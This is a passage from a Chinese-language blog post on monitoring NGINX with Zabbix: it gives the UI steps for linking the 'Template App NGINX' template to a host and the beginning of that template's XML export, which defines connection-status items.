NGINX&#x6A21;&#x677F;</strong><br>&#x5230;&#x4E86;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x9636;&#x6BB5;&#xFF0C;&#x767B;&#x9646;zabbix&#x7BA1;&#x7406;&#x7AEF;&#xFF0C;link&#x6A21;&#x677F;&#x5230;nginx&#x670D;&#x52A1;&#x5668;&#xFF1A;configuration-&gt;hosts-&gt;&#x70B9;&#x51FB;nginx&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;-&gt;&#x70B9;&#x51FB;template-&gt;Link new templates&#x8F93;&#x5165;&#x201D;Template App NGINX&#x201D;-&gt;Add-&gt;&#x6700;&#x540E;&#x70B9;&#x51FB;update&#x3002;</p>\n<p><br></p>\n<hr>\n<h3 id=\"Template-App-NGINX&#x6A21;&#x677F;\"><a href=\"#Template-App-NGINX&#x6A21;&#x677F;\" class=\"headerlink\" title=\"Template App NGINX&#x6A21;&#x677F;\"></a>Template App NGINX&#x6A21;&#x677F;</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span><br><span class=\"line\">&lt;zabbix_<span class=\"built_in\">export</span>&gt;</span><br><span class=\"line\">    &lt;version&gt;2.0&lt;/version&gt;</span><br><span class=\"line\">    &lt;date&gt;2016-10-6T01:29:50Z&lt;/date&gt;</span><br><span class=\"line\">    &lt;groups&gt;</span><br><span class=\"line\">        &lt;group&gt;</span><br><span class=\"line\">            &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">        &lt;/group&gt;</span><br><span class=\"line\">    &lt;/groups&gt;</span><br><span class=\"line\">    &lt;templates&gt;</span><br><span class=\"line\">        &lt;template&gt;</span><br><span class=\"line\">            &lt;template&gt;Template App NGINX&lt;/template&gt;</span><br><span class=\"line\">            &lt;name&gt;Template App NGINX&lt;/name&gt;</span><br><span class=\"line\">            &lt;description&gt;&lt;/description&gt;</span><br><span class=\"line\">            &lt;groups&gt;</span><br><span class=\"line\">                &lt;group&gt;</span><br><span class=\"line\">                    &lt;name&gt;Templates&lt;/name&gt;</span><br><span class=\"line\">                &lt;/group&gt;</span><br><span class=\"line\">            &lt;/groups&gt;</span><br><span class=\"line\">            &lt;applications&gt;</span><br><span class=\"line\">                &lt;application&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                &lt;/application&gt;</span><br><span class=\"line\">            &lt;/applications&gt;</span><br><span class=\"line\">            &lt;items&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections active&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[active]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;active&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections reading&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[reading]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;reading&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections waiting&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[waiting]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;waiting&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status connections writing&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    &lt;multiplier&gt;0&lt;/multiplier&gt;</span><br><span class=\"line\">                    &lt;snmp_oid/&gt;</span><br><span class=\"line\">                    &lt;key&gt;nginx.status[writing]&lt;/key&gt;</span><br><span class=\"line\">                    &lt;delay&gt;60&lt;/delay&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">history</span>&gt;90&lt;/<span class=\"built_in\">history</span>&gt;</span><br><span class=\"line\">                    &lt;trends&gt;365&lt;/trends&gt;</span><br><span class=\"line\">                    &lt;status&gt;0&lt;/status&gt;</span><br><span class=\"line\">                    &lt;value_<span class=\"built_in\">type</span>&gt;3&lt;/value_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;allowed_hosts/&gt;</span><br><span class=\"line\">                    &lt;units/&gt;</span><br><span class=\"line\">                    &lt;delta&gt;0&lt;/delta&gt;</span><br><span class=\"line\">                    &lt;snmpv3_contextname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securityname/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_securitylevel&gt;0&lt;/snmpv3_securitylevel&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authprotocol&gt;0&lt;/snmpv3_authprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_authpassphrase/&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privprotocol&gt;0&lt;/snmpv3_privprotocol&gt;</span><br><span class=\"line\">                    &lt;snmpv3_privpassphrase/&gt;</span><br><span class=\"line\">                    &lt;formula&gt;1&lt;/formula&gt;</span><br><span class=\"line\">                    &lt;delay_flex/&gt;</span><br><span class=\"line\">                    &lt;params/&gt;</span><br><span class=\"line\">                    &lt;ipmi_sensor/&gt;</span><br><span class=\"line\">                    &lt;data_<span class=\"built_in\">type</span>&gt;0&lt;/data_<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;authtype&gt;0&lt;/authtype&gt;</span><br><span class=\"line\">                    &lt;username/&gt;</span><br><span class=\"line\">                    &lt;password/&gt;</span><br><span class=\"line\">                    &lt;publickey/&gt;</span><br><span class=\"line\">                    &lt;privatekey/&gt;</span><br><span class=\"line\">                    &lt;port/&gt;</span><br><span class=\"line\">                    &lt;description&gt;writing&lt;/description&gt;</span><br><span class=\"line\">                    &lt;inventory_link&gt;0&lt;/inventory_link&gt;</span><br><span class=\"line\">                    &lt;applications&gt;</span><br><span class=\"line\">                        &lt;application&gt;</span><br><span class=\"line\">                            &lt;name&gt;nginx&lt;/name&gt;</span><br><span class=\"line\">                        &lt;/application&gt;</span><br><span class=\"line\">                    &lt;/applications&gt;</span><br><span class=\"line\">                    &lt;valuemap/&gt;</span><br><span class=\"line\">                    &lt;logtimefmt/&gt;</span><br><span class=\"line\">                &lt;/item&gt;</span><br><span class=\"line\">                &lt;item&gt;</span><br><span class=\"line\">                    &lt;name&gt;nginx status PING&lt;/name&gt;</span><br><span class=\"line\">                    &lt;<span class=\"built_in\">type</span>&gt;0&lt;/<span class=\"built_in\">type</span>&gt;</span><br><span class=\"line\">                    &lt;snmp_community/&gt;</span><br><span class=\"line\">                    